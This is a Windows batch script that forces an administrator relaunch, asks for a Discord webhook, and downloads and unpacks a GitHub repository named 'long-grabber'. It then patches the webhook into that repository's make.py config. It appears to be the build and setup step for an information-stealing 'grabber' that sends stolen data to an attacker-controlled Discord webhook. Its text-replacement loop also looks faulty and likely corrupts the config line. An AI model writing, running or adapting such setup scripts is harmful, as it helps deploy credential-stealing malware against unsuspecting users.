@echo off
setlocal enabledelayedexpansion

rem Check if running with admin privileges
>nul 2>&1 net session && (
    rem Running with admin privileges
) || (
    rem Not running with admin privileges, so restart with admin rights
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit /b
)

rem Prompt user for webhook if not already set
if "%WEBHOOK%"=="" (
    set /p WEBHOOK=Enter Discord webhook URL:
)

rem Create a temporary directory for storing the downloaded files
set "TEMP_DIR=%TEMP%\github_downloads"
mkdir "%TEMP_DIR%"

rem Download the repository ZIP file using PowerShell with authentication
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/longfen/long-grabber/archive/main.zip', '%TEMP_DIR%\repository.zip')"

rem Extract the ZIP file to the Documents folder, overwriting existing folder if it exists
powershell -Command "Expand-Archive -Path '%TEMP_DIR%\repository.zip' -DestinationPath '%USERPROFILE%\Documents' -Force"

rem Replace the webhook token in make.py with the provided webhook
set "MAKE_SCRIPT=%USERPROFILE%\Documents\long-grabber-main\make.py"
set "NEW_WEBHOOK=%WEBHOOK%"
if not "%NEW_WEBHOOK%"=="" (
    set "PLACEHOLDER=__CONFIG__ = {'webhook': '"
    for /f "delims=" %%a in ('type "%MAKE_SCRIPT%" ^| find /v /n ""') do (
        set "line=%%a"
        setlocal enabledelayedexpansion
        set "line=!line:%PLACEHOLDER%=%NEW_WEBHOOK%!"
        echo(!line:*]=! >> "%MAKE_SCRIPT%.tmp"
        endlocal
    )
    move /y "%MAKE_SCRIPT%.tmp" "%MAKE_SCRIPT%"
)

rem Cleanup: Delete the temporary directory
rmdir /s /q "%TEMP_DIR%"

pause
